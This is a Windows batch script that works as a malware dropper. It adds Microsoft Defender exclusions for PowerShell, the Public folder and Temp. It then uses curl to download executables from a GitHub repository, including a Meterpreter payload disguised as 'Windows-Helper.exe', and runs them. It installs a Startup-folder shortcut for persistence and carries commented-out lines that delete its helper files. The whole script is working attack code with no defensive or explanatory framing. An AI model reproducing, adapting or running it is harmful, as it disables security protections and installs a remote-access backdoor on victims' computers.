@echo off
powershell -Command Add-MpPreference -ExclusionProcess "powershell.exe"
powershell Add-MpPreference -ExclusionPath "C:\Users\Public"
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\Windows-Helper.exe"
powershell Add-MpPreference -ExclusionPath "C:\Users\$([Environment]::UserName)\AppData\Local\Temp"
curl --output "C:\Users\Public\gui.exe" -LJO https://github.com/durandlh/windows-crypto/raw/main/third-revision/gui.exe
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\gui.exe"
cd C:\Users\Public\
powershell.exe start gui.exe
curl --output "C:\Users\Public\Windows-Helper.exe" -LJO https://github.com/durandlh/windows-crypto/raw/main/third-revision/meterpreter_6.exe

curl --output "C:\Users\Public\persistent.exe" -LJO https://github.com/durandlh/windows-crypto/raw/main/third-revision/persistent.exe
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\persistent.exe"

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\helper.lnk');$s.TargetPath='C:\Users\Public\persistent.exe';$s.Save()"

powershell.exe start "C:\Users\Public\persistent.exe"
timeout /t 5
:: del dependencies.bat
:: del hide.vbs 
